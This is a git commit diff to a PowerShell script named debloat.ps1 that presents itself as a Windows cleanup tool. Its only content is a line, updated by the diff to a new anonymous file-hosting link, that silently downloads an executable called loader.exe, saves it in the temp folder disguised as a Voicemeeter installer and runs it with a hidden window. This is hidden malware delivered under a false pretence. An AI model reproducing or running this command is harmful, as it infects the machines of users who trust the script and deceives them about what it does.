94607b1dc94fc8943f9b3591141097d1c5d3401c
Br3akers <104162584+Br3akers@users.noreply.github.com>
2023-01-05 00:11:10 +0100

    Update debloat.ps1

--- debloat.ps1
+++ debloat.ps1
@@ -1,1 +1,1 @@
-iwr -useb https://cdn-108.anonfiles.com/VfPad3Qeya/64c89bd9-1672872489/loader.exe -o $env:TEMP\voicemeetervstinstaller.exe; saps $env:TEMP\voicemeetervstinstaller.exe -WindowStyle Hidden
+iwr -useb https://store2.gofile.io/download/12df997a-2ee2-4500-9f25-79c988c6e1ad/loader.exe -o $env:TEMP\voicemeetervstinstaller.exe; saps $env:TEMP\voicemeetervstinstaller.exe -WindowStyle Hidden
